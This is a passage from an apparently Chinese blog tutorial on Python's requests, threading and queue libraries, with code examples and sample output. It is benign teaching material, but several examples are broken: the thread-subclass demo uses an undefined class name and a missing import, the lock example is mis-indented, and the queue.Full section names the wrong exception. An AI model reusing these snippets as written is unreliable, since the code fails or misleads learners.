python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/cookies'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url, cookies=cookies)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;'</span></span><br></pre></td></tr></table></figure><p><strong>③ 重定向</strong></p><blockquote><p>默认情况下，除了 HEAD, Requests 会自动处理所有重定向。</p><p>可以使用响应对象的 <code>history</code> 方法来追踪重定向。</p><p><a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response.history" target="_blank" rel="noopener"><code>Response.history</code></a> 是一个 <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response" target="_blank" rel="noopener"><code>Response</code></a> 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。</p></blockquote><p>例如，Github 将所有的 HTTP 请求重定向到 HTTPS：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.url</span><br><span class="line"><span class="string">'https://github.com/'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[&lt;Response [<span class="number">301</span>]&gt;]</span><br></pre></td></tr></table></figure><p>如果你使用的是GET、OPTIONS、POST、PUT、PATCH 或者 DELETE，那么你可以通过 <code>allow_redirects</code> 参数禁用重定向处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">301</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p><strong>④ 超时</strong></p><p>你可以告诉 requests 在经过以 <code>timeout</code> 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://github.com'</span>, timeout=<span class="number">0.001</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=<span class="string">'github.com'</span>, port=<span class="number">80</span>): Request timed out. (timeout=<span class="number">0.001</span>)</span><br></pre></td></tr></table></figure><p><font size="2">注意：<code>timeout</code> 仅对连接过程有效，与响应体的下载无关。 <code>timeout</code> 并不是整个下载响应的时间限制，而是如果服务器在 <code>timeout</code> 秒内没有应答，将会引发一个异常（更精确地说，是在 <code>timeout</code> 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out.</font></p><h4 id="2requests库主要的7个方法"><a class="markdownIt-Anchor" href="#2requests库主要的7个方法"></a> 2.requests库主要的7个方法</h4><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>requests.request()</td><td>构造一个请求，支撑一下各方法的基础方法</td></tr><tr><td>requests.get()</td><td>获取HTML网页的主要方法，对应HTTP的GET</td></tr><tr><td>requests.post()</td><td>向HTML网页提交POST请求方法，对应HTTP的POST</td></tr><tr><td>requests.put()</td><td>向HTML网页提交PUT请求的方法，对应HTTP的RUT</td></tr><tr><td>requests.head()</td><td>获取HTML网页头的信息方法，对应HTTP的HEAD</td></tr><tr><td>requests.patch()</td><td>向HTML网页提交局部修改请求，对应于HTTP的PATCH</td></tr><tr><td>requests.delete()</td><td>向HTML页面提交删除请求,对应HTTP的DELETE</td></tr></tbody></table><h4 id="3response对象的属性"><a class="markdownIt-Anchor" href="#3response对象的属性"></a> 3.response对象的属性</h4><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>r.status_code</td><td>HTTP请求的返回状态</td></tr><tr><td>r.text</td><td>HTTP响应内容的字符串形式，即：url对应的页面内容</td></tr><tr><td>r.encoding</td><td>从HTTP  header中猜测的响应内容编码方式</td></tr><tr><td>r.apparent_encoding</td><td>从内容中分析出的响应内容编码方式（备选编码方式）</td></tr><tr><td>r.content</td><td>HTTP响应内容的二进制形式</td></tr><tr><td>r.headers</td><td>获得头部信息</td></tr><tr><td>r.url</td><td>获得链接</td></tr></tbody></table><h3 id="font-color-navy0x02-threading-库多线程font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-threading-库多线程font"></a> <font color="navy">0x02 threading 库（多线程）</font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br></pre></td></tr></table></figure><blockquote><p>我们要创建 Thread 对象,然后让它们运行，每个 Thread 对象代表一个线程，在每个线程中我们可以让程序处理不同的任务，这就是多线程编程。</p><p><strong>值得注意的是，程序运行时默认就是在主线程上</strong></p><p>创建 Thread 对象有 2 种手段。</p><ol><li>直接创建 Thread ，将一个 callable 对象从类的构造器传递进去，这个 callable 就是回调函数，用来处理任务。</li><li>编写一个自定义类继承 Thread，然后复写 run() 方法，在 run() 方法中编写任务处理代码，然后创建这个 Thread 的子类。</li></ol></blockquote><h4 id="1创建-thread-对象"><a class="markdownIt-Anchor" href="#1创建-thread-对象"></a> 1.创建 Thread 对象</h4><p><code>方法一：直接创建</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">threading</span>.<span class="title">Thread</span><span class="params">(group=None, target=None, name=None, args=<span class="params">()</span>, kwargs=&#123;&#125;, *, daemon=None)</span></span></span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>group</strong> 应该为 <code>None</code>；为了日后扩展 <code>ThreadGroup</code> 类实现而保留。</li><li><strong>target</strong> 是用于 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.run" target="_blank" rel="noopener"><code>run()</code></a> 方法调用的可调用对象。默认是 <code>None</code>，表示不需要调用任何方法。</li><li><strong>name</strong> 是线程名称。默认情况下，由 “Thread-<em>N</em>” 格式构成一个唯一的名称，其中 <em>N</em> 是小的十进制数。</li><li><strong>args</strong> 是用于调用目标函数的参数元组。默认是 <code>()</code>。</li><li><strong>kwargs</strong> 是用于调用目标函数的关键字参数字典。默认是 <code>{}</code>。</li><li>如果不是 <code>None</code>，<em>daemon</em> 参数将显式地设置该线程是否为守护模式。 如果是 <code>None</code> (默认值)，线程将继承当前线程的守护模式属性。</li><li>如果子类型重载了构造函数，它一定要确保在做任何事前，先发起调用基类构造器(<code>Thread.__init__()</code>)。</li></ul></blockquote><p><code>方法二：继承Thread类创建线程类</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,scan)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.scan = scan</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(threading.current_thread().name,<span class="string">"is created!"</span>)</span><br><span class="line">        self.scan._scan()</span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scan</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,a)</span>:</span></span><br><span class="line">        self.a = a</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_scan</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.a):</span><br><span class="line">            print(threading.current_thread().name, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    scan = Scan(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        <span class="comment">#t = threading.Thread(target=scan._scan,daemon=True)    </span></span><br><span class="line">        t = mythread(scan)</span><br><span class="line">        t.start()</span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line">    t.join()</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">        if threading.active_count() &lt;= 1:</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(<span class="string">"The main thread is killed!"</span>)</span><br></pre></td></tr></table></figure><h4 id="2threadingthread-的方法"><a class="markdownIt-Anchor" href="#2threadingthread-的方法"></a> 2.threading.Thread 的方法</h4><blockquote><p>先说几个最常用的，以后再进行补充</p></blockquote><p>① <code>threading.active_count</code>() / <code>threading.activeCount</code>()</p><p>返回当前存活的线程类 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread" target="_blank" rel="noopener"><code>Thread</code></a> 对象。返回的计数等于 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.enumerate" target="_blank" rel="noopener"><code>enumerate()</code></a> 返回的列表长度。</p><p>② <code>threading.current_thread</code>() / <code>threading.currentThread</code>()</p><p>返回当前对应调用者的控制线程的 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread" target="_blank" rel="noopener"><code>Thread</code></a> 对象。如果调用者的控制线程不是利用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#module-threading" target="_blank" rel="noopener"><code>threading</code></a> 创建，会返回一个功能受限的虚拟线程对象。其还可以调用几个实例化方法：</p><ul><li>isAlive(): 返回线程是否活动的</li><li>getName(): 返回线程名</li><li>setName(): 设置线程名</li><li>name(): 返回当前线程的名称</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">threading.current_thread().setName(<span class="string">"主线程"</span>) <span class="comment">#设置线程名字</span></span><br><span class="line">print(threading.current_thread().isAlive()) <span class="comment">#线程是不是活动的</span></span><br><span class="line">print(<span class="string">"当前线程"</span>,threading.current_thread())</span><br><span class="line">print(<span class="string">"获取当前线程名字"</span>,threading.current_thread().getName()</span><br></pre></td></tr></table></figure><p>③ <code>start</code>()</p><blockquote><p>开始线程活动。它在一个线程里最多只能被调用一次。它安排对象的 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.run" target="_blank" rel="noopener"><code>run()</code></a> 方法在一个独立的控制进程中调用。如果同一个线程对象中调用这个方法的次数大于一次，会抛出 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 。</p></blockquote><p>④ <code>run</code>()</p><blockquote><p>代表线程活动的方法。你可以在子类型里重载这个方法。 标准的 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.run" target="_blank" rel="noopener"><code>run()</code></a> 方法会对作为 <em>target</em> 参数传递给该对象构造器的可调用对象（如果存在）发起调用，并附带从 <em>args</em> 和 <em>kwargs</em> 参数分别获取的位置和关键字参数。</p></blockquote><p>⑤ <code>join</code>(timeout=None)`</p><blockquote><ul><li><p>等待，直到线程终结。这会阻塞调用这个方法的线程，直到被调用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 的线程终结 – 不管是正常终结还是抛出未处理异常 – 或者直到发生超时，超时选项是可选的。</p></li><li><p>当 <em>timeout</em> 参数存在而且不是 <code>None</code> 时，它应该是一个用于指定操作超时的以秒为单位的浮点数或者分数。因为 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 总是返回 <code>None</code> ，所以你一定要在 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 后调用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.is_alive" target="_blank" rel="noopener"><code>is_alive()</code></a> 才能判断是否发生超时 – 如果线程仍然存活，则 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 超时。</p></li><li><p>当 <em>timeout</em> 参数不存在或者是 <code>None</code> ，这个操作会阻塞直到线程终结。</p></li><li><p>一个线程可以被 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 很多次。</p></li><li><p>如果尝试加入当前线程会导致死锁， <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 会引起 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 异常。如果尝试 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 一个尚未开始的线程，也会抛出相同的异常。</p></li></ul></blockquote><p>⑥ <code>daemon</code></p><blockquote><p>一个表示这个线程是（True）否（False）守护线程的布尔值。一定要在调用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.start" target="_blank" rel="noopener"><code>start()</code></a> 前设置好，不然会抛出 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 。初始值继承于创建线程；主线程不是守护线程，因此主线程创建的所有线程默认都是 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.daemon" target="_blank" rel="noopener"><code>daemon</code></a> = <code>False</code>。下面先看一段代码：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        print(threading.current_thread().name+<span class="string">' test '</span>,i)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">thread = threading.Thread(target=test,name=<span class="string">'TestThread'</span>)</span><br><span class="line"><span class="comment"># thread = threading.Thread(target=test,name='TestThread',daemon=True)</span></span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    print(threading.current_thread().name+<span class="string">' main '</span>, i)</span><br><span class="line">    print(thread.name+<span class="string">' is alive '</span>, thread.isAlive())</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>程序运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TestThread test  0</span><br><span class="line">MainThread main  0</span><br><span class="line">TestThread is alive  True</span><br><span class="line">MainThread main  1</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  1</span><br><span class="line">MainThread main  2</span><br><span class="line">TestThread is alive  True</span><br><span class="line">MainThread main  3</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  2</span><br><span class="line">MainThread main  4</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  3</span><br><span class="line">TestThread test  4</span><br></pre></td></tr></table></figure><p><font size="2">MainThread 没有代码运行的时候，TestThread 还在运行。这是因为 MainThread 在等待其他线程的结束。TestThread 中 daemon 属性默认是 False，这使得 MainThread 需要等待它的结束，自身才结束。**如果要达到，MainThread 结束，子线程也立马结束，怎么做呢？**其实很简单，只需要在子线程调用 start() 方法之前设置 daemon 就好了。当然也可以在子线程的构造器中传递 daemon 的值为 True。</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thread = threading.Thread(target=test,name=<span class="string">'TestThread'</span>,daemon=<span class="keyword">True</span>)</span><br><span class="line"><span class="comment"># thread.setDaemon(True)</span></span><br></pre></td></tr></table></figure><h4 id="3threading锁问题"><a class="markdownIt-Anchor" href="#3threading锁问题"></a> 3.threading锁问题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.lock = threading.RLock()</span><br></pre></td></tr></table></figure><p>其方法有：</p><ul><li><p><code>acquire</code>(<em>blocking=True</em>, <em>timeout=-1</em>)</p><p>可以阻塞或非阻塞地获得锁。当无参数调用时： 如果这个线程已经拥有锁，递归级别增加一，并立即返回。否则，如果其他线程拥有该锁，则阻塞至该锁解锁。一旦锁被解锁(不属于任何线程)，则抢夺所有权，设置递归等级为一，并返回。如果多个线程被阻塞，等待锁被解锁，一次只有一个线程能抢到锁的所有权。在这种情况下，没有返回值。当发起调用时将 <em>blocking</em> 参数设为真值，则执行与无参数调用时一样的操作，然后返回 <code>True</code>。当发起调用时将 <em>blocking</em> 参数设为假值，则不进行阻塞。 如果一个无参数调用将要阻塞，则立即返回 <code>False</code>；在其他情况下，执行与无参数调用时一样的操作，然后返回 <code>True</code>。当发起调用时将浮点数的 <em>timeout</em> 参数设为正值时，只要无法获得锁，将最多阻塞 <em>timeout</em> 所指定的秒数。 如果已经获得锁则返回 <code>True</code>，如果超时则返回假值。<em>在 3.2 版更改:</em> 新的 <em>timeout</em> 形参。</p></li><li><p><code>release</code>()</p><p>释放锁，自减递归等级。如果减到零，则将锁重置为非锁定状态(不被任何线程拥有)，并且，如果其他线程正被阻塞着等待锁被解锁，则仅允许其中一个线程继续。如果自减后，递归等级仍然不是零，则锁保持锁定，仍由调用线程拥有。只有当前线程拥有锁才能调用这个方法。如果锁被释放后调用这个方法，会引起 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 异常。没有返回值。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_writeReult</span><span class="params">(self, result)</span>:</span></span><br><span class="line">    self.lock.acquire()<span class="comment"># 获取锁</span></span><br><span class="line">    <span class="keyword">with</span> open(self.oFileName, <span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(result + <span class="string">"\n"</span>)<span class="comment"># 写入文件</span></span><br><span class="line"> self.lock.release()<span class="comment"># 释放锁</span></span><br></pre></td></tr></table></figure><h4 id="4thread继承问题"><a class="markdownIt-Anchor" href="#4thread继承问题"></a> 4.thread继承问题</h4><p>前面讲过，直接初始化一个 Thread，然后，现在还有一种方式就是自定义一个 Thread 的子类，然后复写它的 run() 方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name=None)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self,name=name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            print(threading.current_thread().name + <span class="string">' test '</span>, i)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">thread = TestThread(name=<span class="string">'TestThread'</span>)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    print(threading.current_thread().name+<span class="string">' main '</span>, i)</span><br><span class="line">    print(thread.name+<span class="string">' is alive '</span>, thread.isAlive())</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>上面的代码，我们自定义了 TestThread 这个类，然后继承了 threading.Thread。</p><p>只有在 run() 方法中处理逻辑。最终代码运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">TestThread test  0</span><br><span class="line">MainThread main  0</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  1</span><br><span class="line">MainThread main  1</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  2</span><br><span class="line">MainThread main  2</span><br><span class="line">TestThread is alive  True</span><br><span class="line">MainThread main  3</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  3</span><br><span class="line">MainThread main  4</span><br><span class="line">TestThread test  4</span><br><span class="line">TestThread is alive  True</span><br><span class="line">123456789101112131415</span><br></pre></td></tr></table></figure><h4 id="5相关问题"><a class="markdownIt-Anchor" href="#5相关问题"></a> 5.相关问题</h4><blockquote><ol><li>run()和start()的区别是什么？</li><li>如何继承构造线程？</li></ol></blockquote><h4 id="6参考文章"><a class="markdownIt-Anchor" href="#6参考文章"></a> 6.参考文章</h4><ol><li><a href="https://blog.csdn.net/briblue/article/details/85101144" target="_blank" rel="noopener">Python多线程编程(一）：threading 模块 Thread 类的用法详解</a></li><li><a href="https://blog.csdn.net/weixin_40481076/article/details/101594705" target="_blank" rel="noopener">python多线程详解（超详细）</a></li></ol><h3 id="font-color-navy0x03-queue-库font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-queue-库font"></a> <font color="navy">0x03 queue 库</font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line">q = queue.Queue()</span><br></pre></td></tr></table></figure><h4 id="1queue的常用方法"><a class="markdownIt-Anchor" href="#1queue的常用方法"></a> 1.queue的常用方法</h4><p>①  <code>q.put(item, block=True, timeout=None)</code></p><ul><li>item：放入队列中的数据元素。</li><li>block：当队列中元素个数达到上限继续往里放数据时：如果 block=False，直接引发 queue.Full 异常；如果 block=True，且 timeout=None，则一直等待直到有数据出队列后可以放入数据；如果 block=True，且 timeout=N，N 为某一正整数时，则等待 N 秒，如果队列中还没有位置放入数据就引发 queue.Full 异常。</li><li>timeout：设置超时时间。</li></ul><p>② <code>q.put_nowait(item)</code></p><blockquote><p>相当于 Queue.put(item, block=False)，当队列中元素个数达到上限继续往里放数据时直接引发 queue.Full 异常。</p></blockquote><p>③ <code>q.get(block=True, timeout=None)</code></p><blockquote><p>从队列中取出数据并返回该数据内容。</p></blockquote><ul><li>block：当队列中没有数据元素继续取数据时：如果 block=False，直接引发 queue.Empty 异常；如果 block=True，且 timeout=None，则一直等待直到有数据入队列后可以取出数据；如果 block=True，且 timeout=N，N 为某一正整数时，则等待 N 秒，如果队列中还没有数据放入的话就引发 queue.Empty 异常。</li><li>timeout：设置超时时间。</li></ul><p>④ <code>q.get_nowait()</code></p><blockquote><p>相当于 Queue.get(block=False)block，当队列中没有数据元素继续取数据时直接引发 queue.Empty 异常。</p></blockquote><p>⑤ <code>q.qsize()</code></p><blockquote><p>返回队列中数据元素的个数。</p></blockquote><p>⑥ <code>q..empty()</code></p><blockquote><p>如果队列为空，返回 True，否则返回 False。</p><p>示例如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line">q = queue.Queue()</span><br><span class="line">print(q.empty())  <span class="comment"># 对列为空，返回 True</span></span><br><span class="line">q.put(<span class="string">'python-100'</span>)  <span class="comment"># 在队列中插入元素 'python-100'</span></span><br><span class="line">print(q.empty())  <span class="comment"># 对列不为空，返回 False</span></span><br></pre></td></tr></table></figure><p>⑦ <code>q.full()</code></p><blockquote><p>如果队列中元素个数达到上限，返回 True，否则返回 False。</p></blockquote><h4 id="2queue的异常"><a class="markdownIt-Anchor" href="#2queue的异常"></a> 2.queue的异常</h4><p>① <code>queue.Full 异常</code></p><blockquote><p>当队列数据元素容量达到上限时，继续往队列中放入数据会引发 queue.Empty 异常，主要是不正当使用 put() 和 put_nowait() 引起的。</p></blockquote><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    q = queue.Queue(<span class="number">3</span>)  <span class="comment"># 设置队列上限为3</span></span><br><span class="line">    q.put(<span class="string">'python'</span>)  <span class="comment"># 在队列中插入字符串 'python'</span></span><br><span class="line">    q.put(<span class="string">'-'</span>) <span class="comment"># 在队列中插入字符串 '-'</span></span><br><span class="line">    q.put(<span class="string">'100'</span>) <span class="comment"># 在队列中插入字符串 '100'</span></span><br><span class="line">    q.put(<span class="string">'stay hungry, stay foolish'</span>, block=<span class="keyword">False</span>)  <span class="comment"># 队列已满，继续往队列中放入数据，引发 queue.Full 异常</span></span><br><span class="line"><span class="keyword">except</span> queue.Full:</span><br><span class="line">    print(<span class="string">'queue.Full'</span>)</span><br></pre></td></tr></table></figure><p>② <code>queue.Empty 异常</code></p><blockquote><p>当队列中没有数据元素时，取出队列中的数据会引发 queue.Empty 异常，主要是不正当使用 get() 和 get_nowait() 引起的。</p></blockquote><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 